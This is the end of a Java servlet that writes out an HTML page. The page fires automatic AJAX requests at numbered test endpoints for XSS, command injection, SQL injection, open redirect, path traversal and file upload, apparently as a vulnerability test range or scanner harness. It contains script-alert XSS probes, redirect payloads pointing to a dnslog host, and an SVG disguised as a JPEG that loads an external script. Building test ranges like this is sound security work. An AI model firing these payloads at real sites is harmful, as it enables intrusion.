                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00032\", \"BS00032\", \"1d\", \"/xss/BS00032\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00032',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00032=<script>alert(1);<\\/script>',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00032\": \"BS00032\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" );
        sb.append(
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00024\", \"BS00024\", \"1d\", \"/cmdi/BS00024\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00024',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00024\": \"BS00024\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00030\", \"BS00030\", \"1d\", \"/xss/BS00030\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00030',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00030=<script>alert(1);<\\/script>',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00030\": \"BS00030\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00018\", \"BS00018\", \"1d\", \"/cmdi/BS00018\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00018',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00018=BS00018',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00018\": \"BS00018\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00150\", \"BS00150\", \"1d\", \"/sqli/BS00150?BS00150=userid\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00150?BS00150=userid',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00150\": \"BS00150\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00126\", \"BS00126\", \"1d\", \"/redirect/BS00144\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00144',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00144=https://www.dnslog.com',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00126\": \"BS00126\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00126\", \"BS00126\", \"1d\", \"/redirect/BS00145\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00145',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00145=https://www.dnslog.com',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00126\": \"BS00126\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00151\", \"BS00151\", \"1d\", \"/sqli/BS00151?BS00151=userid\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00151?BS00151=userid',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00151\": \"BS00151\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" );
        sb.append(
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00019\", \"BS00019\", \"1d\", \"/pathtraver/BS00019\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/pathtraver/BS00019',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00101\": \"BS00101\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00031\", \"BS00031\", \"1d\", \"/pathtraver/BS00031\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/pathtraver/BS00031',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00101\": \"BS00101\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00025\", \"BS00025\", \"1d\", \"/cmdi/BS00025\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00025',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00025\": \"BS00025\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00117\", \"BS00117\", \"1d\", \"/upload/BS00117\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/upload/BS00117',\n" +
                "                    type: 'POST',\n" +
                "                    data: '--------------------------5fad52c609219d12'+\"\\n\"+'Content-Disposition: form-data; name=\"file\"; filename=\"jstv_2.jpeg\"'+'\\n'+'Content-Type: image/svg+xml'+'\\n'+'\\n'+'<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"1in\" height=\"1in\"><script type=\"text/javascript\" charset=\"utf-8\" xlink:href=\"https://alipay.com/jstv_jquery_2.js\"><\\/script>xxxxx</svg>'+'\\n'+'--------------------------5fad52c609219d12',\n" +
                "                    cache: false,\n" +
                "                    contentType: 'multipart/form-data; boundary=------------------------5fad52c609219d12;',\n" +
                "                    headers: {\"BS00117\": \"BS00117\"},\n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "</body>\n" +
                "\n" +
                "</html>");
        out.write(
                sb.toString());

    }
}